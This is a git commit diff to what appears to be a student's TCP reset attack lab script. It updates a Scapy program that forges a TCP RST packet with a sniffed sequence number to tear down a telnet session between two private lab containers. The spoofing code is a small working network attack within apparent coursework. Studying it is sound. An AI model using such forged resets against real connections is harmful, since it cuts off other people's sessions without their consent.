af0bd899d9039e9434ea89f1bc03fc63149dd671
Austin Tyler Conn <austinc3030@users.noreply.github.com>
2023-03-28 19:51:08 -0400

    Update tas2 manual with actual values

--- src/task2_manual.py
+++ src/task2_manual.py
@@ -4,19 +4,19 @@ from random import randrange
 import sys
 
 # Fill with values found during analysis
-intSourcePort = 48638
-intNextSequenceNumber = 4089193648
+intDestinationPort = 35998
+intNextSequenceNumber = 5737490
 
 # Targeting victim/server container's telnet port
 strSourceIP = "10.9.0.5"
 strDestinationIP = "10.9.0.6"
-intDestinationPort =  23
+intSourcePort =  23
 
 # Build the IP layer of the packet
 lyrIP = IP(src=strSourceIP, dst=strDestinationIP)
 
 # Build TCP layer of the packet
-lyrTCP = TCP(sport=intDestinationPort, dport=intSourcePort, flags="R", seq=intNextSequenceNumber)
+lyrTCP = TCP(sport=intSourcePort, dport=intDestinationPort, flags="R", seq=intNextSequenceNumber)
 
 # Build the full packet and show it
 pktResetPacket = lyrIP / lyrTCP
